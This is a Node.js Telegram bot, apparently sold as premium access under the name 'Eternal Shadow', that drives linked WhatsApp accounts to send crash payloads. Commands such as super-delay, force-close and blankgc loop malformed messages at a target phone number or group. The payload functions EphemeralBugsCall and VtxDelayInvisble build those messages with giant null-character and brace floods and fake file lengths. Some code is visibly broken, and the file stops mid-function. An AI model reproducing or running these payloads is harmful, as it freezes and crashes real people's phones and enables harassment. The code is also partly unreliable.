const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const axios = require('axios');
const path = require("path");
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    proto,
    prepareWAMessageMedia,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const P = require("pino");
const chalk = require('chalk');
const { BOT_TOKEN } = require("./setting/config");
const crypto = require('crypto');
const premiumFile = './database/premiumuser.json';
const ownerFile = './database/owneruser.json';
let bots = [];

//========================================================\\ 
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/eternalshadow1900-cloud/Database-EtSh/main/dbtoken.json";

async function fetchValidTokens() {
    try {
        const response = await axios.get(GITHUB_TOKEN_LIST_URL);
        return response.data; 
    } catch (error) {
        console.error(chalk.red("Gagal mengambil token database di GitHub!"), error.message);
        return [];
    }
}

async function validateToken() {
    console.log(chalk.blue("Loading Check Token Bot..."));
    const validTokens = await fetchValidTokens();

    if (!validTokens.tokens || !Array.isArray(validTokens.tokens)) {
        console.log(chalk.red("Data token tidak valid dari GitHub!"));
        process.exit(1);
    }

    if (!validTokens.tokens.includes(BOT_TOKEN)) {
        console.log(chalk.red("Yah Ada Maling Sc😹"));
        process.exit(1);
    }

    console.clear();
    console.log(chalk.bold.white("✅ Token Valid! Menyiapkan Bot...\n"));
}

//========================================================\\

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let sock = null;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const imageUrl = "https://files.catbox.moe/xvu08j.jpg";

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
// --- Koneksi WhatsApp ---
async function connectToWhatsApp(botNumber, ctx) {
  const chatId = ctx.chat.id;

  const sentMsg = await ctx.telegram.sendMessage(
    chatId,
    `┏━━━━━━━━━━━━━━━━━━━━━━
┃      INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
    { parse_mode: "Markdown" }
  );

  const statusMessage = sentMsg.message_id;

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION 
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, ctx);
      } else {
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await ctx.telegram.editMessageText(
        chatId,
        statusMessage,
        null,
        `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`,
        { parse_mode: "Markdown" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "KAII1234");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

          await ctx.telegram.editMessageText(
            chatId,
            statusMessage,
            null,
            `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
            { parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
      }
    }
  });

  socl.ev.on("creds.update", saveCreds);

  return sock;
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.replyWithPhoto(imageUrl, {
      caption: "```\nプレミアムユーザーとして登録されていません。\n```",
      parse_mode: "MarkdownV2",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 Buy Access", url: "https://t.me/${config.TELE_OWNER}" }],
          [{ text: "Developer", url: "https://t.me/KaiiGood" }, { text: "Info", url: "https://t.me/infoeternalshadow" }]
        ]
      }
    });
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};

//++++++++++++++++++++++++++++++++++++++++++//
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
//++++++++++++++++++++++++++++++++++++++++++//

bot.command('start', async (ctx) => {
  const userId = ctx.from?.id?.toString() || '';
  const isPremium = premiumUsers.includes(userId);
  const premiumStatus = isPremium ? '✅' : '❌';
  const username = ctx.from.first_name || ctx.from.username || "User";

  await ctx.replyWithPhoto(imageUrl, {
  caption: `\`\`\`
🍂 𝐄𝐭𝐞𝐫𝐧𝐚𝐥 ☇ 𝐒𝐡𝐚𝐝𝐨𝐰˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
\`\`\`( 👀 ) 𝗛𝗼𝗹𝗮𝗮 ☇ ${username} 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗳𝗲𝗮𝘁𝘂𝗿𝗲 𝘄𝗶𝘀𝗲𝗹𝘆, 𝘁𝗵𝗲 𝗰𝗿𝗲𝗮𝘁𝗼𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝗲 𝗳𝗼𝗿 𝘄𝗵𝗮𝘁 𝘆𝗼𝘂 𝗱𝗼 𝘄𝗶𝘁𝗵 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁, 𝗲𝗻𝗷𝗼𝘆.

⬡ Author : @KaiiGood [ Kaii </> ]
⬡ Version : 1.0Vip
⬡ Framework : Telegraf
⬡ Prefix : /
⬡ Premium : ${premiumStatus}

© Kaii – 2025`,
  parse_mode: 'Markdown',
  reply_markup: {
    inline_keyboard: [
      [
        { text: "𝐁𝐮𝐠 ☇ 𝐌𝐞𝐧𝐮", callback_data: "bugmenu" },
        { text: "𝐎𝐰𝐧𝐞𝐫 ☇ 𝐌𝐞𝐧𝐮", callback_data: "ownermenu" }
      ],
      [{ text: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", callback_data: "thanksto" }],
      [{ text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", url: "https://t.me/KaiiGood" }]
    ]
  }
});
});

//======================= [ action ] =========================\\ 
bot.on("callback_query", async (ctx) => {
  const userId = ctx.from?.id?.toString() || '';
  const message = ctx.callbackQuery?.message;
  const data = ctx.callbackQuery?.data;

  if (!message || !message.chat) {
    console.error("callbackQuery.message atau .chat tidak tersedia.");
    return ctx.answerCbQuery("Terjadi kesalahan.");
  }

  const chatId = message.chat.id;
  const messageId = message.message_id;
  const newImage = imageUrl;
  const isPremium = premiumUsers.includes(userId);
  const premiumStatus = isPremium ? '✅' : '❌';
  const username = ctx.from.first_name || ctx.from.username || "User";
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = `\`\`\`
  ( 👾 ) 𝗘𝗧𝗘𝗥𝗡𝗔𝗟 𝗦𝗛𝗔𝗗𝗢𝗪 ☇ 𝗕𝗨𝗚 
  ──────────────────────────
  𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚋𝚞𝚐 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.
  ▢ /sᴜᴘᴇʀ-ᴅᴇʟᴀʏ ʊ ɴᴜᴍʙᴇʀ
  ╰➤ Delay WhatsApp
  ▢ /ғᴏʀᴄᴇ-ᴄʟᴏsᴇ ʊ ɴᴜᴍʙᴇʀ
  ╰➤ Forceclose WhatsApp
  ▢ /ᴄʀᴀsʜ-ɪᴏs ʊ ɴᴜᴍʙᴇʀ
  ╰➤ Crash Ios ( Bug Ios )
  \`\`\``;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
    
    
  } else if (data === "ownermenu") {
    newCaption = `\`\`\`
   𝘖 𝘞 𝘕 𝘌 𝘙 - 𝘔 𝘌 𝘕 𝘜
  ──────────────────────────
  ▢ /addprem <id> <day>
  ╰➤ Menambahkan akses pada user
  ▢ /delprem <id>
  ╰➤ Menghapus akses pada user
  ▢ /cekprem 
  ╰➤ Melihat waktu/status prem
  ▢/listsender
  ╰➤ Melihat jumlah sender
  \`\`\``;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
    
    
  } else if (data === "thanksto") {
    newCaption = `\`\`\`👏 𝘛 𝘏 𝘈 𝘕 𝘒 𝘚  -  𝘛 𝘖 𝘖 ──────────────────────────
    ▢ Kaii { @KaiiGood } [ Dev ]
    ▢ Fenzzz { @FenzzzKece } [ My Friend + Support ]
    ▢ Ortu [ Support ]
    ▢ Allah [ Tuhan ]
   © Kaii
    \`\`\``;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
 
 
  } else if (data === "mainmenu") {
    newCaption = `\`\`\`
🍂 𝐄𝐭𝐞𝐫𝐧𝐚𝐥 ☇ 𝐒𝐡𝐚𝐝𝐨𝐰˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
\`\`\`( 👀 ) 𝗛𝗼𝗹𝗮𝗮 ☇ ${username} 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗳𝗲𝗮𝘁𝘂𝗿𝗲 𝘄𝗶𝘀𝗲𝗹𝘆, 𝘁𝗵𝗲 𝗰𝗿𝗲𝗮𝘁𝗼𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝗲 𝗳𝗼𝗿 𝘄𝗵𝗮𝘁 𝘆𝗼𝘂 𝗱𝗼 𝘄𝗶𝘁𝗵 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁, 𝗲𝗻𝗷𝗼𝘆.

⬡ Author : @KaiiGood [ Kaii </> ]
⬡ Version : 1.0Vip
⬡ Framework : Telegraf
⬡ Prefix : /
⬡ Premium : ${premiumStatus}

© Kaii – 2025`;
    newButtons = [
      [
        { text: "𝐁𝐮𝐠 ☇ 𝐌𝐞𝐧𝐮", callback_data: "bugmenu" },
        { text: "𝐎𝐰𝐧𝐞𝐫 ☇ 𝐌𝐞𝐧𝐮", callback_data: "ownermenu" }
      ],
      [{ text: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", callback_data: "thanksto" }],
      [{ text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", url: "https://t.me/KaiiGood" }]
    ];
  }

  try {
    await ctx.telegram.editMessageMedia(chatId, messageId, null, {
      type: "photo",
      media: newImage,
      caption: newCaption,
      parse_mode: "Markdown"
    });

    await ctx.telegram.editMessageReplyMarkup(chatId, messageId, null, {
      inline_keyboard: newButtons
    });
  } catch (err) {
    console.error("Error editing message:", err);
    ctx.answerCbQuery("Terjadi kesalahan saat memperbarui pesan.");
  }
});

//====================== [ cmd bug ] ============================\\ 

bot.command('super-delay', checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /super-delay 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/xvu08j.jpg",
    filename: "𝗜'𝗠 𝗔 𝗞𝗔𝗜𝗜.jpg"
  }, {
    caption: `\`\`\`
( 👾 ) 𝐄𝐭𝐞𝐫𝐧𝐚𝐥 𝐒𝐡𝐚𝐝𝐨𝐰 ☇ 𝐁𝐮𝐠 \`\`\`
ターゲット: ${target}
バグの種類: super-delay
状態: ✅

\`\`\`© 𝐊𝐚𝐢𝐢 – 𝟐𝟎𝟐𝟓\`\`\`
`.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤 𝐌𝐞𝐧𝐮 ☇ 𝐁𝐮𝐠", callback_data: "bugmenu" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) continue;

        for (let i = 0; i < 150; i++) {
          await VtxDelayInvisble(sock, target);
          await sleep(2000)
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim bug:", err);
  }
});

bot.command('force-close', checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /force-close 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/xvu08j.jpg",
    filename: "𝗜'𝗠 𝗔 𝗞𝗔𝗜𝗜.jpg"
  }, {
    caption: `\`\`\`
( 👾 ) 𝐄𝐭𝐞𝐫𝐧𝐚𝐥 𝐒𝐡𝐚𝐝𝐨𝐰 ☇ 𝐁𝐮𝐠 \`\`\`
ターゲット: ${𝐭𝐚𝐫𝐠𝐞𝐭}
バグの種類: force-close
状態: ✅

\`\`\`© 𝐊𝐚𝐢𝐢 – 𝟐𝟎𝟐𝟓\`\`\`
`.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤 𝐌𝐞𝐧𝐮 ☇ 𝐁𝐮𝐠", callback_data: "bugmenu" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) continue;

        for (let i = 0; i < 150; i++) {
          await EphemeralBugsCall(sock, target);
          await sleep(1000);
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim bug:", err);
  }
});

bot.command('xsystemui', checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /xsystemui 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/k25ovn.jpg",
    filename: "ᔫ 𖣂 𝐀𝐏𝐎𝐂𝐀ˊˊ𝐋𝐘𝐏𝐒𝐄 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\`\`\`
Цель: ${target}
тип ошибки: Xsystemui
Статус: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🥑 Успешно отправлено в цель
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤˚𝐌𝐞𝐧𝐨𝐮𝐬", callback_data: "bugmenu" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) continue;

        for (let i = 0; i < 25; i++) {
          await Uipaw(sock, target);
          await sleep(1000);
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim bug:", err);
  }
});

bot.command("blankgc", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /blankgc https://chat.whatsapp.com/xxxx atau /blankgc 1203xxxxxx@g.us`);
  }

  if (sessions.size === 0) {
    return ctx.reply("Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender");
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/k25ovn.jpg",
    filename: "ᔫ 𖣂 𝐀𝐏𝐎𝐂𝐀ˊˊ𝐋𝐘𝐏𝐒𝐄 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\`\`\`
Цель: ${displayUrl}
тип ошибки: Blankgc
Статус: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🥑 Успешно отправлено в цель
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤˚𝐌𝐞𝐧𝐨𝐮𝐬", callback_data: "bugmenu" }]
      ]
    }
  });

  // Eksekusi tanpa balasan hasil
  for (const [botNum, sock] of sessions.entries()) {
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 5; i++) {
        await NewsletterZapTeks(sock, target);
        await sleep(1000);
      }

    } catch (err) {
      console.log(`Bot ${botNum} error:`, err.message);
    }
  }
});

//list bot
bot.command('listsender', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "❌ Tidak ada nomor WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let sock = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${sock}. ${botNumber}\n`;
      sock++;
    }

    ctx.reply(
      `#- 𝘓 𝘐 𝘚 𝘛 - 𝘚 𝘌 𝘕 𝘋 𝘌 𝘙
╰➤ Daftar bot yang terhubung\n\n▢ ${botList}`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    ctx.reply(
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk addsender WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addsender ☇ nomor");
    }

    const inputNumber = args[1];
    const botNumber = inputNumber.replace(/[^0-9]/g, "");
    const chatId = ctx.chat.id;

    try {
        await connectToWhatsApp(botNumber, ctx);
    } catch (error) {
        console.error("Error in addsender:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('sock', (err) => { // 'sock' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});
  
// ========================= [ FUNC GRUP ] ========================= \\


// ========================= [ FUNC ] ========================= \\
async function EphemeralBugsCall(target, Ptcp = true) {
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
          fileLength: "9999999999999",
          pageCount: 3567587327,
          mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
          fileName: "\u0000".repeat(100),
          fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
          directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1735456100",
          contactVcard: true,
          caption: "\u0000".repeat(2000),
          jpegThumbnail: ""
        },
        hasMediaAttachment: true
      },
      body: {
        text: "RaldzzXyz" + "ꦾ".repeat(60000)
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(9999999),
        buttons: Array(90).fill({
          name: "phynx_agency_json",
          buttonParamsJson: "{".repeat(119000)
        })
      }
    }
  })
}

async function VtxDelayInvisble(target) {
  try {
    let msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Bg Lu Kenal GyzenLyoraa Ga?..",
                format: "",
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1000),
                version: 3,
              },
              contextInfo: {
                mentionedJid: [target],
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "../GyzenLyoraa.",
                    mediaType: "IMAGE",
                    jpegThumbnail: "",
                    caption: "Vortunix delay invisible",
                  },
                  placeholderKey: {
                    remoteJid: "0s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890",
                  },
                },
              },
            },
          },
        },
      },
      {
        userJid: target,
        quoted: null,
      }
    );

    try {
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
    } catch (error) {
      console.error(chalk.red(`Error relaying message: ${error}`));
    }

    await new Promise((resolve) => setTimeout(resolve, 3000));

    if (mention) {
      try {
        await sock.relayMessage(
          target,
          {
            statusMentionMessage: {
              message: {
                protocolMessage: {
                  key: msg.key,
                  type: 25,
                },
              },
            },
          },
          {}
        );
      } catch (error) {
        console.error(chalk.red(`Error sending mention: ${error}`));
      }
    }

    console.log(chalk.green(`Delay Invisible sukses untuk ${target}`));
  } catch (error) {
